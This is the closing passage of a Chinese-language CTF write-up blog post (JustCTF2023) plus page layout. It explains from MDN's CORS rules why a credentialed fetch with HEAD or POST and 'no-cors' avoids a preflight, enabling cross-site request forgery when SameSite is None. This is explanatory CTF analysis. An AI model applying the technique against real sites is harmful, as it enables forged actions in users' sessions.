<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD"><code>HEAD</code></a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST"><code>POST</code></a><blockquote>
<ul>
<li>Apart from the headers automatically set by the user agent (for example,<code>Connection</code>,<code>User-Agent</code> , or the other headers defined in the Fetch spec as a <em>forbidden header name</em>), the only headers which are allowed to be manually set arethose which the Fetch spec defines as a CORS-safelisted request-header , which are:</li>
</ul>
</blockquote>
</li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept"><code>Accept</code></a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept-Language"><code>Accept-Language</code></a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Language"><code>Content-Language</code></a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type"><code>Content-Type</code></a> (please note the additional requirements below)</li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Range"><code>Range</code></a> (only with a <a target="_blank" rel="external nofollow noopener noreferrer" href="https://fetch.spec.whatwg.org/#simple-range-header-value">simple range header value</a>; e.g., <code>bytes=256-</code> or <code>bytes=127-255</code>)</li>
</ul>
<p>虽然这里没写cookie，但是测试了一下发现加上<code>&#123;credentials: &quot;include&quot;&#125;</code>也不会触发预检请求，并且head请求也算在简单请求的范围内，所以可以一键打通</p>
<p>这里rmb在payload里还添加了另一个选项<code>&#123;mode: &quot;no-cors&quot;&#125;</code>，这个选项感觉就是主动放弃 访问response，这样子由于cors未被满足导致的无法读取结果的报错也就不会产生，并不能强行无视预检请求进行发送<br>（以及原来post也能是简单请求，那在samesite为none的情况下感觉post都能随意csrf了）<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch#supplying_request_options">Using Fetch</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/API/Request/mode">Request: mode property</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/wp/" rel="tag"># wp</a>
              <a href="/tags/JavaScript/" rel="tag"># JavaScript</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%85%A5%E9%97%A82.0.html" rel="prev" title="域渗透入门2.0">
      <i class="fa fa-chevron-left"></i> 域渗透入门2.0
    </a></div>
      <div class="post-nav-item">
    <a href="/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB2.0.html" rel="next" title="博客迁移2.0">
      博客迁移2.0 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JustCTF2023"><span class="nav-number">1.</span> <span class="nav-text">JustCTF2023</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Dangerous"><span class="nav-number">1.1.</span> <span class="nav-text">Dangerous</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eXtra-Safe-Security-layers"><span class="nav-number">1.2.</span> <span class="nav-text">eXtra Safe Security layers</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Perfect-Product"><span class="nav-number">1.3.</span> <span class="nav-text">Perfect Product</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Aquatic-Delights"><span class="nav-number">1.4.</span> <span class="nav-text">Aquatic Delights</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phantom"><span class="nav-number">1.5.</span> <span class="nav-text">Phantom</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://thirdqq.qlogo.cn/g?b=sdk&k=LSKHut5Wmfic1emlMT4FpuA&kti=ZMCGFwAAAAI&s=640&t=1673848139">
  <p class="site-author-name" itemprop="name">Z3ratu1</p>
  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">188</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">94</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
